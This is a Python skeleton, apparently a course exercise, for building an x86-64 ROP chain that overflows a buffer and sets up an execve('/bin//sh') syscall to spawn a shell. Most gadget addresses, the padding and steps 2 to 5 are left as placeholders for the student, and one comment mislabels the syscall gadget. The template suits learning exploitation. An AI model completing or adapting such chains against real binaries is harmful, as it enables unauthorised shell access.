

# This python script will help you to set up your ROP-chain
# You just need to complete it (see the comments)

#!/bin/env python3
from struct import pack
from os import write

pop_rax = pack("<Q", 0x451f87) # address of the "pop rax ; ret" gadget (check if it is correct !)
pop_rdi = pack("<Q", XXX) # address of the "pop rdi ; ret" gadget
pop_rsi = pack("<Q", XXX) # address of the "pop rsi ; ret" gadget
pop_rdx = pack("<Q", XXX) # address of the "pop rdx ; ret" gadget
movd_rdx_rax = pack("<Q", XXX)  # address of the "mov qword ptr [rdx], rax ; ret" gagdet
syscall = pack("<Q", XXX) # address of the "pop rax ; ret" gadget
at_data = pack("<Q", XXX)  # address of data segment
null = pack("<Q", 0x00)
execve = pack("<Q", 59)
buff = XXX * b"A"           # Fill the target buffer up to the return address
                            # REPLACE XXX by the correct padding value !

# Our gadget chain starts here !

""" step 1: write /bin/sh in the data segment """
buff += pop_rdx
buff += at_data
buff += pop_rax
buff += b"/bin//sh"
buff += movd_rdx_rax

""" set up the call to syscall execve """
 # XXXX   complete the ROP chain here ...
 # using the indications provided in the subject
 # (step 2 to step 5)
buff += syscall  # syscall ...

write(1, buff)  # write buff to stdout ...
write(1, b"\n") # trigger!

